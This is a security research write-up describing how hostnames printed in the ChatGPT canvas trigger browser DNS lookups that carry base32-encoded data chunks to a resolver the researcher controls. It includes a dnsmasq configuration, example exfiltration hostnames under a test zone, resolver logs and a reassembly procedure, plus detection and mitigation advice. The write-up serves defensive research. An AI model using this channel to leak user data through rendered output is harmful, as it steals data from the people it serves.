Exfiltrating Data via DNS from the ChatGPT Canvas
Executive summary
This write-up documents a controlled research experiment that uses DNS lookups triggered by the ChatGPT canvas to move a small payload, such as an image, without HTTP requests or file uploads. The model only prints strings. The canvas renders those strings. The browser then issues DNS queries for the hostnames that appear in the rendered content. By operating a local resolver that is authoritative for a private test zone, the full query name carries the payload in its subdomain labels and is visible in resolver logs. The method is demonstrated in a lab context and paired with concrete detection and mitigation guidance.

System model and assumptions
Client: a macOS laptop with the ChatGPT canvas open in a browser.
Resolver: dnsmasq running locally, acting as a normal forwarder for the internet and as the authoritative server for a single private test zone.
Zone control: the test zone is not delegated on the public internet and exists only on the local resolver.
Goal: show that DNS queries caused by the canvas can carry a payload in the query name and that the resolver logs are sufficient to reconstruct the payload.
Method overview
Encode the payload as text using a DNS-safe alphabet, for example base32 or base64url.
Split the text into chunks that fit DNS limits: each label not exceeding 63 characters and the full name not exceeding about 253 characters.
Add a minimal index or control marker to each chunk so the sequence can be reassembled deterministically.
Cause the canvas to print hostnames that embed each chunk as the leftmost label under the private test zone.
Allow the browser to render the canvas. Rendering triggers DNS lookups for those hostnames.
Capture the queries at the local authoritative resolver. Each query name contains the next chunk.
Reassemble the chunks in order and decode back to the original bytes.
A one-page diagram of the flow is available here: dns_exfil_flow.png.

Why the canvas is the trigger
The canvas is a rendering surface. When it presents text that looks like a resource reference, such as an image source, stylesheet URL, or link target, the browser resolves the hostname. The model does not initiate network activity. The browser does so during rendering. DNS therefore becomes a passive carrier.

dnsmasq in the lab
The resolver must do three things:

Listen on loopback so the client’s DNS goes through it.
Treat a private test zone as local and authoritative so queries for that zone are never forwarded.
Log every query so the full names are available for reconstruction.
Minimal configuration excerpt
The following illustrates the intent. Paths may differ by installation. Use a private test zone such as exfil.lab.

# Loopback only
listen-address=127.0.0.1,::1
port=53
bind-interfaces

# Normal recursion for everything else
server=1.1.1.1
server=2606:4700:4700::1111

# Make the test zone local and authoritative
local=/exfil.lab/

# Wildcard reply for any name in the zone
address=/.exfil.lab/127.0.0.1
# Optional AAAA
# address=/.exfil.lab/::1

# Per-query logging
log-queries
log-facility=/opt/homebrew/var/log/dnsmasq.log
Why this works:

local=/exfil.lab/ stops forwarding and makes the resolver authoritative, so the full query name is visible locally.
address=/.exfil.lab/127.0.0.1 returns a valid answer for every name in the zone, which keeps lookups in a successful state and avoids retry loops.
log-queries writes each query line with the complete name.
Ensure the macOS network settings list 127.0.0.1 as the first DNS server so the browser’s lookups reach this resolver.

Message format that rides inside the name
A practical pattern for the leftmost label is:

<index><separator><payload-chunk>[<separator><checksum-or-end>]
Constraints:

Character set must be legal in hostnames. For base64 use the URL variant or remap the symbols that are not allowed.
Leftmost label length must stay within 63 characters.
Each chunk should be unique to prevent caching from collapsing the sequence.
An index, for example p001, p002, ensures correct ordering.
Example fully qualified names as printed by the canvas:

p001_db.MFRGGZDFMZTQ====.exfil.lab
p002_db.MFWWK3TLNB2GI===.exfil.lab
The authoritative resolver sees the names exactly as above and logs them.

What the resolver logs look like
Exact formatting varies by build. The essential elements are the query type, the full name, and the source.

Jun 01 12:00:01 dnsmasq[12345]: query[A] p001_db.MFRGGZDFMZTQ.exfil.lab from 127.0.0.1
Jun 01 12:00:01 dnsmasq[12345]: config exfil.lab is local
Jun 01 12:00:01 dnsmasq[12345]: reply p001_db.MFRGGZDFMZTQ.exfil.lab is 127.0.0.1

Jun 01 12:00:02 dnsmasq[12345]: query[A] p002_db.MFWWK3TLNB2G.exfil.lab from 127.0.0.1
Jun 01 12:00:02 dnsmasq[12345]: reply p002_db.MFWWK3TLNB2G.exfil.lab is 127.0.0.1
You will usually see dual-stack requests as well:

Jun 01 12:00:02 dnsmasq[12345]: query[AAAA] p002_db.MFWWK3TLNB2G.exfil.lab from ::1
Jun 01 12:00:02 dnsmasq[12345]: reply p002_db.MFWWK3TLNB2G.exfil.lab is ::
These lines are sufficient for reconstruction because they include the entire query name.

Reconstruction procedure
Parse the log file and filter for the test zone.
Extract the leftmost label from each name.
Parse out the index and payload chunk.
Sort by index and concatenate the chunks.
Decode from base32 or base64url to bytes.
Validate length or checksum and write the result to disk.
This can be implemented with a few lines of scripting. The logic is simple because the ordering is explicit in the index and the data sits in the labels.

What a capture should show
Many unique subdomains under the test zone within a short time window.
Leftmost labels that are long and have high Shannon entropy, often forty characters or more.
A clear sequence marker such as p001, p002 included either in the leftmost label or as a dedicated label.
Resolver responses returning a fixed loopback address for all names in the zone.
These characteristics distinguish the channel from ordinary traffic, such as CDN hostnames or mDNS advertising.

Detection and operations guidance
Product and UI

Treat untrusted hostnames in canvas output as inert text unless they match a strict allow list.
Prefer offline rendering for previews in sensitive contexts.
Apply a content security policy that limits external hostnames and resource types.
Enforce limits on the number and total length of hostnames that may appear in a single canvas render.
Network and DNS

Centralize DNS egress through controlled recursive resolvers and block direct access to public DoH or DoT endpoints.
Use Response Policy Zones to quarantine suspicious test zones quickly.
Alert on names where the first label length exceeds forty characters and exhibits high entropy.
Alert on high uniqueness ratios under one zone in short time windows and on bursts of NXDOMAIN if the authoritative server is intentionally silent.
Limitations and scope
Throughput is modest. The method is suitable for small payloads. Aggressive parallelism increases detectability. Some legitimate infrastructures use long or hexadecimal labels. Detection should consider multiple signals and known benign patterns to reduce false positives. This write-up is intended for controlled research with non-sensitive data.

Conclusion
The canvas renders text that looks like resources. Rendering causes DNS lookups. If the names are under a zone you control and the leftmost labels carry encoded chunks, the resolver logs alone are enough to reconstruct the original payload. Operating a local authoritative resolver and logging every query completes the loop. The risk lives at the UI and network boundary rather than inside the model, which is why hardening the canvas and controlling DNS egress are effective countermeasures.

Diagram for inclusion in your report: dns_exfil_flow.png




Full logs on github.com/snailsploit